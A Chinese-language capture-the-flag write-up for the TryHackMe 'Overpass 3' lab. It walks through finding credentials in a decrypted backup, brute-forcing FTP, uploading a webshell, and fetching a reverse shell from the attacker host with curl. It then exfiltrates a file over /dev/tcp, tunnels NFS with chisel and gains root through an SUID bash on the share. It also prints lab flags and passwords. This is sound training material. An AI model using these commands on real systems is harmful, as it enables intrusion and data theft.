# Overpass 3
###### tags: `thm`
> URL : https://tryhackme.com/room/overpass3hosting

IP :  10.10.208.60 

## Recon
- 先掃 Port
    - `rustscan -a 10.10.208.60`
    - ![](https://i.imgur.com/rD5MaOl.png)
- 嘗試 FTP Anonymous 登入
    - ![](https://i.imgur.com/S4radmP.png)
    - 發現不行
- 觀察首頁
    - ![](https://i.imgur.com/M2jslnM.png)
- 掃目錄
    - `python3 dirsearch.py -u http://10.10.208.60/`
    - `/backups/`
    - 找到一包 Backup
        - ![](https://i.imgur.com/yoQyHaf.png)
## GPG 解密
- 觀察 Backup
    - `wget http://10.10.208.60/backups/backup.zip`
    - 裡面有兩個檔案
        - ![](https://i.imgur.com/8jvPuov.png)
        - ![](https://i.imgur.com/E0JaxzX.png)
        - gpg 加密後的檔案跟它的 key
            - `gpg --import priv.key`
            - `gpg --output ./a.xlsx --decrypt ./CustomerDetails.xlsx.gpg`
        - ![](https://i.imgur.com/QYAREMT.png)
- 解開後是一個 Excel 表格
    - ![](https://i.imgur.com/FN7APLv.png)
    - `paradox:ShibesAreGreat123`
    - `0day:OllieIsTheBestDog`
    - `muirlandoracle:A11D0gsAreAw3s0me`
## 爆破密碼
- 有一連串的帳號跟密碼，試著用 Hydra 爆破 SSH
    - `hydra -L user.txt -P pass.txt ssh://10.10.208.60`
    - ![](https://i.imgur.com/PuFlIx6.png)
    - 發現 SSH 不能用密碼登入
- 試著爆破 FTP
    - `hydra -L user.txt -P pass.txt ftp://10.10.208.60`
    - ![](https://i.imgur.com/Y6IYkJ7.png)
    - 找到了一組帳密可以使用
        - `paradox:ShibesAreGreat123`
## FTP 2 Webshell
- 嘗試登入 FTP
    - ![](https://i.imgur.com/77Rwv2x.png)
    - 發現看起來是 webroot
    - 放隻 Webshell 上去
    - `put webshell.php`
    - ![](https://i.imgur.com/m1YHIcT.png)
    - 發現成功惹!!
- 使用 Webshell
    - ![](https://i.imgur.com/bpVLmNJ.png)
    - 放 Reverse shell
        - http://10.10.208.60/webshell.php?A=curl%20-o%20%20/tmp/s%2010.13.21.55:8000/s
        - 本地開 nc -nlvp 7877
        - http://10.10.208.60/webshell.php?A=bash%20/tmp/s
        - 收到 Reverse shell 
        - ![](https://i.imgur.com/cFAOx7B.png)
## 提權
- 轉互動式 shell
    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- 找 Web Flag
    - `find / -iname '*flag*' -print 2>/dev/null`
    - 找到在 `/usr/share/httpd/web.flag`
        - ![](https://i.imgur.com/Rb4zfZR.png)
    - `thm{0ae72f7870c3687129f7a824194be09d}`
- 準備 Linpeas
    - `curl -o linpeas.sh 10.13.21.55:8000/linpeas.sh`
    - `bash linpeas.sh`
        - Sudo version 1.8.29
    - 發現 nfs 很可疑，但我們先繼續看下去
        - ![](https://i.imgur.com/wufaUIi.png)
        - https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
    - 發現幾個檔案可以 setuid
        - ![](https://i.imgur.com/YS20qF5.png)
        - 但都不能利用
- 發現 nfs 如果需要利用，需要用 showmount，但電腦裡沒有
    - 自己載一包來放著
    - `curl -o ./showmount  http://10.13.21.55:8000/showmount`
    - 但 run 起來都失敗 QQ
- 發現根目錄有奇怪的檔案
    - `/.autorelabel`
    - ![](https://i.imgur.com/h35DLB7.png)
    - 用 nc 傳出來觀察
    - `cat .autorelabel > /dev/tcp/10.13.21.55/1234`
    - 發現裡面是空的 QQ
- 突然想到可能可以切換使用者
    - 因為前面我們 Excel 有密碼
    - `su paradox`
    - ![](https://i.imgur.com/Sve53hC.png)
    - 切換使用者成功

## 二次提權
- 基本上我們猜測接下來就要使用 nfs 的漏洞，但是我們一開始 nfs 在掃 port 時並沒有掃到，因此猜測它只開在 local，我們來掃掃看 local 的 port
    - 準備 nmap binary
        - https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
    - 掃下去
        - ![](https://i.imgur.com/Rvfodoz.png)
        - 找到 nfs 開在 2049 port
- 觀察發現 paradox 的 `.ssh` 只有 public key
    - ![](https://i.imgur.com/wQh4gvk.png)
    - 好ㄉ沒啥用 = =
- 本地端有開 nfs 但我們權限很低，那我們可以把 nfs 給用 port forwarding 打出來，使用 chisel
    - https://github.com/jpillora/chisel
    - `curl http://10.13.21.55:8000/chisel -o chisel`
    - `chmod +x chisel`
- 輸入指令
    - 攻擊機 : `./chisel server --reverse -p 7414`
        - ![](https://i.imgur.com/vnSOu9o.png)
    - 靶機 : `./chisel client 10.13.21.55:7414 R:2049:127.0.0.1:2049`
        - ![](https://i.imgur.com/qVIbN7f.png)
    - 用 nmap 掃攻擊機看看有沒有真的打通
        - ![](https://i.imgur.com/miQAQB8.png)
- 把 nfs mount 到本機
    - `sudo mount -t nfs localhost:/ mount/`
    - ![](https://i.imgur.com/Zt6Z0hF.png)
- 發現 mount 成功
    - ![](https://i.imgur.com/b4HeVgR.png)
    - 裡面有 ssh 的 key，所以我們可以複製出來直接用 james 的 ssh 進行登入
        - ![](https://i.imgur.com/JHhPHll.png)
        - 也找到了 User 的 Flag
- 在攻擊機 mount 的 nfs 目錄
    - 直接複製自己的 `/bin/bash`
    - 給它 +s 提供 suid
        - ![](https://i.imgur.com/WbW1ohS.png)
    - 再用 james 進行執行
        - ![](https://i.imgur.com/KKhTeTA.png)
        - 發現怎麼還是 james QQ
- 再回來攻擊機 chown 把 bash 的 owner 改 root
    - 就可以ㄌ!!
        - ![](https://i.imgur.com/FStYNoX.png)
    
- Root flag
    - `thm{a4f6adb70371a4bceb32988417456c44}`
    - ![](https://i.imgur.com/I99be39.png)

## 學到ㄌ
Port forwarding
NFS 提權
SUID 要 own=root才能用